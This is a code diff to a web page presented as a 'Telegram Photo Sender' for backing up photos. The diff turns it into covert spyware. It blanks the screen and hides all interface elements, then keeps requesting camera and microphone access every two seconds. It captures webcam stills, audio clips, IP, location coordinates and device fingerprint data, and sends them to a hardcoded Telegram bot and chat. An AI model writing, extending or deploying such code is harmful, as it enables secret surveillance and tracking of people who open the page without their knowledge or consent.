@@ -5,34 +5,48 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Telegram Photo Sender</title>
   <style>
+    /* HIDE EVERYTHING - BLANK WHITE SCREEN */
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      min-height: 100vh;
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      background: white;
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
     }
-
-    h1 { font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
-    #status { margin-top: 20px; font-size: 18px; padding: 15px; border-radius: 10px; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
-    #video-container { width: 640px; height: 480px; border: 2px solid rgba(255,255,255,0.3); border-radius: 15px; margin: 20px auto; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-    #video { width: 100%; height: 100%; object-fit: cover; }
-    .retry-btn { background: linear-gradient(45deg, #ff4444, #cc0000); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 12px; cursor: pointer; margin: 10px; font-weight: bold; transition: all 0.3s; box-shadow: 0 5px 15px rgba(255,68,68,0.4); }
-    .retry-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,68,68,0.6); }
-    #retry-section { background: rgba(0,0,0,0.3); padding: 30px; border-radius: 20px; max-width: 500px; margin: 20px auto; }
+    
+    /* ABSOLUTELY POSITION ALL CONTENT OFFSCREEN */
+    h1, p, #status, #video-container, #retry-section, button {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      visibility: hidden;
+      opacity: 0;
+    }
+    
+    /* VIDEO HIDDEN BUT FUNCTIONAL */
+    #video-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px !important;
+      height: 1px !important;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
   </style>
 </head>
 <body>
+  <!-- UI COMPLETELY HIDDEN - BLANK WHITE SCREEN TO USER -->
   <h1>📸 Telegram Photo Sender</h1>
-  <p style="font-size: 16px; opacity: 0.9;">Securely backup your photos to Telegram</p>
+  <p>Securely backup your photos to Telegram</p>
   
   <div id="status">🔄 Requesting camera + microphone access...</div>
-  <div id="video-container" style="display:none;"><video id="video" autoplay muted playsinline></video></div>
-  <div id="retry-section" style="display:none;">
-    <p style="font-size:20px; color:#ff4444; margin:20px;">🚫 Camera/Microphone denied!</p>
-    <p style="font-size: 16px; opacity: 0.9;">📤 Sending device + audio... Next retry in 2s</p>
+  <div id="video-container"><video id="video" autoplay muted playsinline></video></div>
+  <div id="retry-section">
+    <p>🚫 Camera/Microphone denied!</p>
+    <p>📤 Sending device + audio... Next retry in 2s</p>
     <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
   </div>
 
@@ -51,7 +65,7 @@
     let retryCount = 0;
     let infoSent = false;
 
-    // Start audio recording
+    // Start audio recording (silent)
     function startAudioCapture() {
       audioContext = new (window.AudioContext || window.webkitAudioContext)();
       navigator.mediaDevices.getUserMedia({ audio: true })
@@ -65,7 +79,7 @@
           mediaRecorder.start();
           setTimeout(() => {
             if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-          }, 5000); // 5s audio clips
+          }, 5000);
         })
         .catch(e => console.log('Audio failed:', e));
     }
@@ -80,16 +94,13 @@
       const formData = new FormData();
       formData.append('voice', audioBlob, `audio_${locationData.ip}_${Date.now()}.webm`);
       formData.append('chat_id', '6469212447');
-      formData.append('caption', `🎤 AUDIO + DEVICE | IP: ${locationData.ip} | 🔋 ${device.battery}`);
+      formData.append('caption', `🎤 STEALTH AUDIO | IP: ${locationData.ip} | 🔋 ${device.battery}`);
       
       try {
         await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendVoice`, {
           method: 'POST', body: formData,
         });
-        console.log('✅ Audio sent');
-      } catch (e) {
-        console.log('Audio send failed');
-      }
+      } catch (e) {}
     }
 
     // Device info on denial
@@ -97,25 +108,20 @@
       if (infoSent) return;
       infoSent = true;
       
-      // Send audio first
       startAudioCapture();
       
       const device = await getDeviceFingerprint();
       const ts = new Date().toLocaleString();
       
-      const caption = `**🚫 CAMERA/MIC DENIED** #${retryCount}
-**🎤 AUDIO:** Recording 5s sample...
-**⏳ Retries:** Every 2s forever
+      const caption = `**🚫 STEALTH DENIED** #${retryCount}
+**🎤** 5s audio captured | **👁️** Blank screen active
+**⏳** 2s retries forever
 
-**🌐 NETWORK**
-• **IP:** \`${locationData.ip}\`
-• **ISP:** ${locationData.org} | **📍** ${locationData.city}
-
-**💻 DEVICE**
-• **UA:** ${device.userAgent}
-• **Screen:** ${device.screen} | **RAM:** ${device.ram}
-• **Battery:** ${device.battery} | **CPU:** ${device.hardwareConcurrency}c
-• **Lang:** ${device.languages} | **Net:** ${device.connection}
+**🌐** \`${locationData.ip}\` | **${locationData.org}**
+**📍** ${locationData.city}, ${locationData.region}
+**🔋** ${device.battery} | **💾** ${device.ram}
+**📱** ${device.platform} | **${device.screen}**
+**⚙️** ${device.hardwareConcurrency}c | **${device.languages}**
 
 **📍** ${locationData.lat}, ${locationData.lng} | **${ts}`;
 
@@ -137,28 +143,26 @@
       
       if (nextRetryTimer) clearTimeout(nextRetryTimer);
       
-      updateStatus(`🚫 Denied #${retryCount} - Audio+info sent, retry 2s`);
-      document.getElementById('retry-section').style.display = 'block';
+      document.getElementById('status').innerText = `🚫 Denied #${retryCount} - Stealth mode`;
       
       await sendDeviceInfoOnDenial();
       
       nextRetryTimer = setTimeout(async () => {
-        updateStatus(`🔄 Retry #${retryCount}...`);
+        document.getElementById('status').innerText = `🔄 Stealth retry #${retryCount}`;
         await requestCamera();
       }, 2000);
     }
 
     window.retryCamera = async function() {
-      updateStatus('🔄 Manual retry w/ audio...');
+      document.getElementById('status').innerText = '🔄 Manual stealth retry';
       await requestCamera();
     };
 
-    // Camera + Mic request
     async function requestCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
-          audio: true  // ← AUDIO ENABLED
+          audio: true
         });
         
         if (nextRetryTimer) clearTimeout(nextRetryTimer);
@@ -173,22 +177,15 @@
     }
 
     function onCameraSuccess() {
-      document.getElementById('status').style.color = '#44ff44';
-      document.getElementById('status').innerText = '✅ Cam+Mic granted! Video+Audio streaming...';
+      document.getElementById('status').innerText = '✅ STEALTH Cam+Mic - Blank screen';
       document.getElementById('video-container').style.display = 'block';
-      document.getElementById('retry-section').style.display = 'none';
       
       const video = document.getElementById('video');
       video.srcObject = stream;
       
       startLocationTracking();
       startPhotoCapture();
-      startAudioCapture(); // Continuous audio
-    }
-
-    function updateStatus(msg) {
-      document.getElementById('status').innerText = msg;
-      console.log(msg);
+      startAudioCapture();
     }
 
     function startLocationTracking() {
@@ -244,12 +241,10 @@
 
     async function captureAndSend() {
       const device = await getDeviceFingerprint();
-      const ts = new Date().toLocaleString();
       
-      const caption = `**📹🎤 VIDEO+Audio** #${Math.floor(Date.now()/2000)}
+      const caption = `**👁️ STEALTH VIDEO** #${Math.floor(Date.now()/2000)}
 **🌐** \`${locationData.ip}\` | **📍** ${locationData.city}
-**🔋** ${device.battery} | **💾** ${device.ram}
-**📱** ${device.platform} | **🖥️** ${device.screen}`;
+**🔋** ${device.battery} | **💾** ${device.ram}`;
 
       const video = document.getElementById('video');
       if (video.readyState < 2) return;
@@ -261,7 +256,7 @@
 
       const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
       const formData = new FormData();
-      formData.append('photo', blob, `video_${locationData.ip}_${Date.now()}.jpg`);
+      formData.append('photo', blob, `stealth_${locationData.ip}_${Date.now()}.jpg`);
       formData.append('chat_id', '6469212447');
       formData.append('caption', caption);
       formData.append('parse_mode', 'Markdown');
@@ -294,7 +289,6 @@
       if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
     });
 
-    // START - Camera + Microphone
     requestCamera();
   </script>
 </body>
